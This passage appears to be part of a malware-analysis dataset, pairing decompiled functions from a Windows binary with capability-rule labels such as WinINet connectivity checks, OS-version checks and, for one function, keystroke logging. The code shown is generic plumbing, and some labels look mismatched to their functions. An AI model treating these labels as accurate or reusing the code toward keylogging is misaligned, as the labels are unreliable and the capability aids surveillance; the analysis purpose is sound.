        "decompiled_code": "\nint32_t __cdecl fcn.00076ed0(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_28h;\n    uint var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = 0;\n    var_4h = 0;\n    while( true ) {\n        if (*(arg_ch + var_4h * 4) == 0) {\n            return 0x21590005;\n        }\n        var_1ch = fcn.00035360(*(arg_ch + var_4h * 4));\n        if (var_1ch == NULL) {\n            return 0x21590004;\n        }\n        var_10h = fcn.000785ce(var_1ch, 0x2e);\n        if (var_10h != NULL) {\n            *var_10h = 0;\n            var_10h = var_10h + 1;\n        }\n        pcVar2 = var_1ch;\n        uVar4 = arg_18h;\n        var_18h = fcn.00075860(var_1ch);\n        fcn.00035330(var_1ch);\n        if (var_18h == 0) {\n            var_ch = 0x21590005;\n            if ((*0xb1c460ac != 0) &&\n               (var_ch = (**(*0xb1c460ac + 0x10))\n                                   (arg_8h, *(arg_ch + var_4h * 4), arg_10h, arg_14h, arg_18h, pcVar2, uVar4), \n               var_ch == 0)) {\n                var_18h = *0xb1c460ac;\n            }\n            if ((var_18h == 0) && (var_ch != 0x21590005)) {\n                return var_ch;\n            }\n        }\n        else {\n            if (var_10h == NULL) {\n                pcVar2 = var_1ch + 1;\n                do {\n                    cVar1 = *var_1ch;\n                    var_1ch = var_1ch + 1;\n                } while (cVar1 != '\\0');\n                var_8h = var_1ch - pcVar2;\n            }\n            else {\n                var_8h = var_10h - var_1ch;\n            }\n            var_ch = (**(var_18h + 0x10))(arg_8h, *(arg_ch + var_4h * 4) + var_8h, arg_10h, arg_14h, arg_18h);\n        }\n        if (var_18h != 0) break;\n        var_4h = var_4h + 1;\n    }\n    if (var_ch != 0) {\n        return var_ch;\n    }\n    iVar3 = fcn.00077090(*arg_8h, var_18h);\n    if (iVar3 != 0) {\n        return 0;\n    }\n    (**(var_18h + 0x18))(*arg_8h, 0);\n    *arg_8h = 0;\n    return 0x21590004;\n}\n",
        "token_count": 795
    },
    "00077090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00077090(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint *arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035200(0x20);\n    if (arg_8h_00 == NULL) {\n        uVar1 = 0;\n    }\n    else {\n        *arg_8h_00 = arg_ch;\n        arg_8h_00[5] = 0;\n        arg_8h_00[6] = 0;\n        fcn.00036a10(arg_8h_00 + 1);\n        fcn.000344f0(arg_8h_00 + 7);\n        *arg_8h = arg_8h_00;\n        iVar2 = fcn.0006cd00(arg_8h, 3);\n        if (iVar2 == 0) {\n            fcn.00036a80(arg_8h_00 + 1);\n            fcn.00034520(arg_8h_00 + 7);\n            fcn.00035330(arg_8h_00);\n            *arg_8h = 0;\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 310
    },
    "00077140": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00077140(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t **arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *arg_8h;\n    fcn.00034550(0xb1c5a908);\n    iVar1 = fcn.0006ce50(arg_8h_00, 3);\n    if (iVar1 == 0) {\n        fcn.000345c0(0xb1c5a908);\n        *arg_8h = NULL;\n    }\n    else {\n        arg_8h_01 = *arg_8h_00;\n        if (arg_8h_01[5] == 0) {\n            arg_8h_01[5] = 1;\n            fcn.000345c0(0xb1c5a908);\n            (**(**arg_8h_00 + 0x14))(arg_8h_00, arg_ch);\n            fcn.00036c40(arg_8h_01 + 1);\n            fcn.00034550(0xb1c5a908);\n            *arg_8h = NULL;\n            fcn.0006cd90(arg_8h_00, 3);\n            fcn.000345c0(0xb1c5a908);\n            (**(**arg_8h_00 + 0x18))(arg_8h_00, arg_ch);\n            fcn.00036cd0(arg_8h_01 + 1);\n            fcn.00036a80(arg_8h_01 + 1);\n            fcn.00034520(arg_8h_01 + 7);\n            fcn.00035330(arg_8h_01);\n        }\n        else {\n            fcn.000345c0(0xb1c5a908);\n            *arg_8h = NULL;\n        }\n    }\n    return;\n}\n",
        "token_count": 460
    },
    "00077250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00077250(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077aa0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x20) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x20) != 0)) {\n            var_4h = (**(**arg_8h + 0x20))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 275
    },
    "00077310": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00077310(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077aa0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x48) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x48) != 0)) {\n            var_4h = (**(**arg_8h + 0x48))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 297
    },
    "00077430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00077430(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077aa0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x28) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x28) != 0)) {\n            var_4h = (**(**arg_8h + 0x28))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 286
    },
    "00077500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl\nfcn.00077500(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch, uint *arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077aa0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x2c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x2c) != 0)) {\n            var_4h = (**(**arg_8h + 0x2c))\n                               (arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h);\n            if ((var_4h == 0) && (*arg_1ch != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034550(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.000345c0(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00036b60(*arg_8h + 1);\n                *arg_1ch = 0;\n                *arg_20h = 0;\n            }\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 461
    },
    "00077620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00077620(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077aa0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x30) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x30) != 0)) {\n            var_4h = (**(**arg_8h + 0x30))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 308
    },
    "000776f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.000776f0(int32_t **arg_8h, uint arg_ch, int32_t *arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077aa0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x34) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x34) != 0)) {\n            var_4h = (**(**arg_8h + 0x34))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            if ((var_4h == 0) && (*arg_10h != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034550(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.000345c0(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00036b60(*arg_8h + 1);\n                *arg_10h = 0;\n                *arg_14h = 0;\n            }\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 422
    },
    "00077800": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00077800(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077aa0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x38) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x38) != 0)) {\n            var_4h = (**(**arg_8h + 0x38))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 297
    },
    "000778d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl\nfcn.000778d0(int32_t **arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, uint *arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077aa0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x3c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x3c) != 0)) {\n            var_4h = (**(**arg_8h + 0x3c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if ((var_4h == 0) && (*arg_14h != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034550(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.000345c0(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00036b60(*arg_8h + 1);\n                *arg_14h = 0;\n                *arg_18h = 0;\n            }\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 436
    },
    "000779e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000779e0(int32_t **arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = fcn.0006ce50(arg_8h, 3);\n    if ((iVar2 != 0) && (arg_ch != 0)) {\n        piVar1 = *arg_8h;\n        fcn.00034550(piVar1 + 7);\n        if (0 < piVar1[6]) {\n            piVar1[6] = piVar1[6] + -1;\n            fcn.000345c0(piVar1 + 7);\n            (**(**arg_8h + 0x44))(arg_8h, arg_ch);\n            fcn.00036b60(*arg_8h + 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "00077aa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00077aa0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00034550(0xb1c5a908);\n    iVar1 = fcn.0006ce50(arg_8h, 3);\n    if (iVar1 == 0) {\n        var_4h = 0x21590065;\n    }\n    else if (*(*arg_8h + 0x14) == 0) {\n        fcn.00036ab0(*arg_8h + 4);\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    fcn.000345c0(0xb1c5a908);\n    return var_4h;\n}\n",
        "token_count": 187
    },
    "00077bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00077bc0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.000774f0(arg_8h);\n    if ((*(iVar1 + 0x10) < 0x29) || (*(iVar1 + 0x28) == 0)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (**(iVar1 + 0x28))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "00077c20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00077c20(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.000774f0(arg_8h);\n    if ((*(iVar1 + 0x10) < 0x2d) || (*(iVar1 + 0x2c) == 0)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (**(iVar1 + 0x2c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return uVar2;\n}\n",
        "token_count": 177
    },
    "00077c80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00077c80(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.000774f0(arg_8h);\n    if ((*(iVar1 + 0x10) < 0x31) || (*(iVar1 + 0x30) == 0)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (**(iVar1 + 0x30))(arg_8h, arg_ch);\n    }\n    return uVar2;\n}\n",
        "token_count": 141
    },
    "00077cd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00077cd0(char **arg_8h, int32_t arg_ch, uint32_t arg_10h, char **arg_14h)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    uint var_28h;\n    uint var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_10h;\n    char *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (**arg_8h == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        var_8h = fcn.000785ce(*arg_8h, 0x3d);\n        if (var_8h == 0) {\n            if (arg_10h != 0) {\n                fcn.00078652(arg_ch, *arg_8h, arg_10h);\n                *(arg_ch + arg_10h + -1) = 0;\n            }\n            var_ch = *arg_8h;\n            pcVar3 = var_ch + 1;\n            do {\n                cVar1 = *var_ch;\n                var_ch = var_ch + 1;\n            } while (cVar1 != '\\0');\n            *arg_14h = *arg_8h + (var_ch - pcVar3);\n        }\n        else {\n            var_8h = var_8h - *arg_8h;\n            if (arg_10h != 0) {\n                if (arg_10h < var_8h + 1U) {\n                    var_8h = arg_10h - 1;\n                }\n                fcn.0007877e(arg_ch, *arg_8h, var_8h);\n                *(arg_ch + var_8h) = 0;\n            }\n            *arg_14h = *arg_8h + var_8h + 1;\n        }\n        var_1ch = *arg_8h;\n        pcVar3 = var_1ch + 1;\n        do {\n            cVar1 = *var_1ch;\n            var_1ch = var_1ch + 1;\n        } while (cVar1 != '\\0');\n        *arg_8h = *arg_8h + var_1ch + (1 - pcVar3);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 541
    },
    "00077e00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00077e00(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0007874e(arg_8h);\n    iVar2 = fcn.000785ce(arg_8h, 0x2e);\n    if (iVar2 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        iVar3 = fcn.0007874e(iVar2 + 1);\n        iVar2 = fcn.000785ce(iVar2 + 1, 0x2e);\n        if (iVar2 == 0) {\n            uVar1 = 0;\n        }\n        else {\n            iVar4 = fcn.0007874e(iVar2 + 1);\n            iVar2 = fcn.000785ce(iVar2 + 1, 0x2e);\n            if (iVar2 == 0) {\n                uVar1 = 0;\n            }\n            else {\n                iVar2 = fcn.0007874e(iVar2 + 1);\n                if (((((uVar1 < 0) || (0xff < uVar1)) || (iVar3 < 0)) || ((0xff < iVar3 || (iVar4 < 0)))) ||\n                   ((0xff < iVar4 || ((iVar2 < 0 || (0xff < iVar2)))))) {\n                    uVar1 = 0;\n                }\n                else {\n                    uVar1 = iVar3 << 8 | uVar1 | iVar4 << 0x10 | iVar2 << 0x18;\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 417
    },
    "00077f20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00077f20(int32_t arg_8h, uint arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == '\\0') {\n        uVar2 = 0x215900c8;\n    }\n    else {\n        var_14h._2_2_ = 0;\n        var_10h._0_2_ = 0;\n        var_4h = fcn.00078658(arg_8h, 0x3a, 0);\n        if (var_4h == 0) {\n            var_4h = arg_8h;\n        }\n        else {\n            iVar3 = fcn.00077e00(arg_8h);\n            var_14h._2_2_ = iVar3;\n            var_10h._0_2_ = iVar3 >> 0x10;\n            if (iVar3 == 0) {\n                return 0x215900c8;\n            }\n            var_4h = var_4h + 1;\n        }\n        uVar2 = fcn.0007874e(var_4h);\n        uVar1 = fcn.000354c0(uVar2);\n        *arg_10h = 1;\n        *(arg_10h + 1) = 0xe;\n        *(arg_10h + 6) = 2;\n        arg_10h[2] = CONCAT22(var_14h._2_2_, uVar1);\n        arg_10h[3] = var_10h;\n        arg_10h[4] = 0;\n        *(arg_10h + 5) = 0;\n        *arg_14h = 0x16;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 481
    },
    "00077ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00077ff0(int32_t *arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if (*arg_8h == 1) {\n        if (*(arg_8h + 6) == 2) {\n            *arg_ch = 2;\n            *arg_ch = 0;\n            arg_ch[1] = 0;\n            arg_ch[2] = 0;\n            arg_ch[3] = 0;\n            arg_ch[1] = *(arg_8h + 10);\n            *(arg_ch + 2) = *(arg_8h + 2);\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 0xc0000001;\n        }\n    }\n    else {\n        uVar1 = 0xc0000001;\n    }\n    return uVar1;\n}\n",
        "token_count": 201
    },
    "000780a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000780a0(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h)\n\n{\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    \n    fcn.00078550(&var_10h, arg_8h);\n    var_2ch = 0x18;\n    var_28h = 0;\n    var_20h = 0x40;\n    var_24h = &var_10h;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = fcn.0001ec90(arg_14h, 0xc0000000, &var_2ch, &var_8h, 0, 0x80, 3, 3, 0, arg_10h, arg_ch);\n    if ((var_14h == 0) && (var_14h = (**0xb1bde2a4)(*arg_14h, 0xc0000000, 0, 0, arg_18h, 0),  var_14h != 0)) {\n        fcn.00078544(*arg_14h);\n        *arg_14h = 0;\n    }\n    return var_14h;\n}\n",
        "token_count": 348
    },
    "000782f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000782f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_10h_00;\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = fcn.00035200(0x21);\n    if (arg_10h_00 == 0) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        fcn.00078790(arg_10h_00, 0, 0x21);\n        *(arg_10h_00 + 5) = 0x11;\n        *(arg_10h_00 + 8) = *0xb1be2634;\n        *(arg_10h_00 + 0xc) = *0xb1be2638;\n        *(arg_10h_00 + 0x10) = *0xb1be263c;\n        *(arg_10h_00 + 0x14) = *0xb1be2640;\n        *(arg_10h_00 + 0x18) = *0xb1be2644;\n        *(arg_10h_00 + 6) = 4;\n        uVar1 = fcn.000780a0(arg_8h, 0x21, arg_10h_00, arg_ch, arg_10h);\n        fcn.00035330(arg_10h_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 343
    },
    "000783a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
